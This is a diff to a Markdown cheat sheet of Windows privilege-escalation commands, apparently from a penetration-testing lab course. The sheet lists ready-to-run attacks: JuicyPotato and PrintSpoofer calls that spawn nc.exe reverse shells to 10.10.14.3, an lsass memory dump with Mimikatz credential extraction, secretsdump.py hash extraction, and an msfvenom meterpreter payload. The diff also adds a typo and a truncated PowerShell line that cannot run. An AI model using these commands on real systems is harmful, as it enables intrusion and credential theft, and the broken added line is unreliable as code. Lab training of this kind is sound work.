@@ -2931,13 +2931,13 @@ apt update hooking (PreInvoke)
 | `mssqlclient.py sql_dev@10.129.43.30 -windows-auth` | Connect using mssqlclient.py |
 | `enable_xp_cmdshell` | Enable xp\_cmdshell with mssqlclient.py |
 | `xp_cmdshell whoami` | Run OS commands with xp\_cmdshell |
-| `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *` | Escalate privileges with JuicyPotato |
-| `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"` | Escalating privileges with PrintSpoofer |
+| `c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 443 -e cmd.exe" -t *` | Escalate privileges with [JuicyPotato](https://github.com/ohpe/juicy-potato). JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards|
+| `c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"` | Escalating privileges with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) |
 | `procdump.exe -accepteula -ma lsass.exe lsass.dmp` | Take memory dump with ProcDump |
 | `sekurlsa::minidump lsass.dmp` and `sekurlsa::logonpasswords` | Use MimiKatz to extract credentials from LSASS memory dump |
 | `dir /q C:\backups\wwwroot\web.config` | Checking ownership of a file |
 | `takeown /f C:\backups\wwwroot\web.config` | Taking ownership of a file |
-| `Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}` | Confirming changed ownership of a file |
+| `Get-ChildItem -Path ‘C:\backups\wwwroot\web.config’ \| select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}` | Confirming chan2ged ownership of a file |
 | `icacls “C:\backups\wwwroot\web.config” /grant htb-student:F` | Modifying a file ACL |
 | `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL` | Extract hashes with secretsdump.py |
 | `robocopy /B E:\Windows\NTDS .\ntds ntds.dit` | Copy files with ROBOCOPY |
@@ -2978,6 +2978,7 @@ apt update hooking (PreInvoke)
 | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe` | Generating a malicious binary |
 | `get-process -Id 3324` | Enumerating a process ID with PowerShell |
 | `get-service \| ? {$_.DisplayName -like 'Druva*'}` | Enumerate a running service by name with PowerShell |
+| `.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((6) | | 
 
 ### Credential Theft
 
